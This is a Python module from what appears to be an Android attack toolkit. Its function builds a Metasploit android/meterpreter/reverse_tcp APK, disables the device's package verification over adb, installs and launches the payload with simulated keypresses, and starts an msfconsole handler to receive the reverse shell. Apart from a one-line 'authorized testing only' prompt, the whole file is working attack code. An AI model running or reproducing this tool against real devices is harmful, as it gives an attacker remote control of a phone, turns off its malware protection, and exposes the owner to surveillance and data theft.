import subprocess
import time
from pathlib import Path

from modules.config import AppConfig
from modules import banner
from modules.console import console, confirm, adb, task_status, get_adb_executable, ask
from modules.connection import get_ip_address, is_valid_ipv4


def hack(config: AppConfig) -> None:
    import os

    os.system(config.clear_cmd)
    console.print(banner.instructions_banner)
    console.print(banner.instruction)
    choice = ask("[prompt]> [/prompt]")

    if choice != "":
        console.print("[bold green]Returning to Main Menu.[/bold green]")
        return

    os.system(config.clear_cmd)
    ip = get_ip_address()
    if ip is None:
        console.print(
            "[bold yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/bold yellow]"
        )
        ip = "127.0.0.1"
    lport = "4444"
    console.print(
        f"[bold cyan]LHOST[/bold cyan] [bold white]{ip}[/bold white]  [bold cyan]LPORT[/bold cyan] [bold white]{lport}[/bold white]"
    )

    modify = ask(
        "[bold yellow]Enter = continue · M = edit LHOST/LPORT[/bold yellow]> "
    ).lower()

    while modify not in ("m", ""):
        modify = ask("[bold red]Enter or M[/bold red]> ").lower()

    if modify == "m":
        ip = ask("[bold cyan]LHOST[/bold cyan]> ").strip()
        lport_in = ask("[bold cyan]LPORT[/bold cyan]> ").strip()
        if not is_valid_ipv4(ip):
            console.print("[bold red]Invalid LHOST → 127.0.0.1[/bold red]")
            ip = "127.0.0.1"
        if lport_in.isdigit() and 1 <= int(lport_in) <= 65535:
            lport = lport_in
        else:
            console.print("[bold yellow]Invalid LPORT → 4444[/bold yellow]")

    if not confirm(
        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
        "Authorized testing only. Continue?"
    ):
        console.print("[bold green]Cancelled.[/bold green]")
        return

    console.print(banner.hacking_banner)

    apk_out = Path("test.apk")
    msfvenom = config.msfvenom_path or "msfvenom"
    msfconsole = config.msfconsole_path or "msfconsole"

    with task_status("[info]msfvenom: building APK…[/info]"):
        result = subprocess.run(
            [
                msfvenom,
                "-p",
                "android/meterpreter/reverse_tcp",
                f"LHOST={ip}",
                f"LPORT={lport}",
                "-o",
                str(apk_out),
            ],
            capture_output=True,
            text=True,
        )
    if result.returncode != 0:
        console.print(f"[bold red]msfvenom failed:[/bold red] {result.stderr or result.stdout}")
        return
    if not apk_out.is_file():
        console.print("[bold red]test.apk missing[/bold red]")
        return

    with task_status("[info]Preparing device (home, verify settings)…[/info]"):
        adb(["shell", "input", "keyevent", "3"])
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])

    adb_exe = get_adb_executable()
    with task_status("[info]adb install payload…[/info]"):
        install = subprocess.run(
            [adb_exe or "adb", "install", "-r", str(apk_out)],
            capture_output=True,
            text=True,
        )
    if install.returncode != 0:
        detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
        console.print(f"[bold red]adb install failed:[/bold red] {detail}")
        with task_status("[info]Restoring app verification…[/info]"):
            adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
            adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
        return

    with task_status("[info]Launching payload…[/info]"):
        adb(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
        time.sleep(3)
        adb(["shell", "input", "keyevent", "22"])
        adb(["shell", "input", "keyevent", "22"])
        adb(["shell", "input", "keyevent", "66"])

    console.print("[bold red]Starting msfconsole handler…[/bold red]")
    subprocess.run(
        [
            msfconsole,
            "-x",
            f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
            f"set LHOST {ip} ; set LPORT {lport} ; exploit",
        ]
    )

    with task_status("[info]Restoring app verification…[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
